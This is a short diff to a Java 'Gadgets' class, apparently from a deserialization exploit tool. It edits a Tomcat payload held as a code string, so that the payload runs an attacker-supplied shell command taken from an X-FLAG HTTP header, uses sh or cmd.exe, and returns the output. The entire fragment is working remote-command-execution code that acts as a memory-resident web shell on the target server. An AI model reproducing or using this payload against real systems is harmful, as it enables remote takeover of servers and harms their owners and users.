@@ -197,7 +197,7 @@ public class Gadgets {
             "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
             "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
             "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
-            "                                        String cmd = \"" + command+"\";\n" +
+            "                                        String cmd = tempRequest.getHeader(\"X-FLAG\");\n" +
             "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
             "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
             "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
